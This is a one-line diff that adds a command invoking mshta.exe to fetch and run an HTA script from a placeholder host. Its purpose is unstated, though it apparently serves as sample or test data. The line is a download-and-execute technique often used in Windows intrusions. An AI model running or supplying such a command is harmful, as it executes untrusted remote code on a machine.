@@ -1,0 +1,1 @@
+mshta.exe http://mshta-2.example.test/b.hta
